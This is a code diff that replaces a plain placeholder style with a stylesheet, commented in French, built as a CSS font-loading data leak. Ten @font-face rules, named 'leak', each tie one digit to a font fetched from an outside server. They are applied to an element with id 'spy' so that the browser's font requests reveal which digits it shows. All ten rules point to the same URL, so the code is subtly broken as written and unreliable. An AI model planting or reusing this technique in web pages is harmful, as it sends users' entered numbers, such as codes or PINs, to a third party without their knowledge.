@@ -1,8 +1,70 @@
-input::placeholder {
-  background-image: url("https://example.com/image.png");
+/* style.css */
 
-  color: red;
-  font-size: 1.2em;
-  font-style: italic;
-  opacity: 0.5;
+/* Configuration pour chaque chiffre */
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0030; /* Chiffre 0 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0031; /* Chiffre 1 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0032; /* Chiffre 2 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0033; /* Chiffre 3 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0034; /* Chiffre 4 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0035; /* Chiffre 5 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0036; /* Chiffre 6 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0037; /* Chiffre 7 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0038; /* Chiffre 8 */
+}
+
+@font-face {
+    font-family: 'leak';
+    src: url("https://ton-serveur.com");
+    unicode-range: U+0039; /* Chiffre 9 */
+}
+
+/* On applique la police à l'input */
+#spy {
+    /* 'leak' sera interrogée en premier, puis le texte s'affichera normalement en Arial */
+    font-family: 'leak', Arial, sans-serif !important;
+    font-size: 24px;
+    padding: 10px;
 }
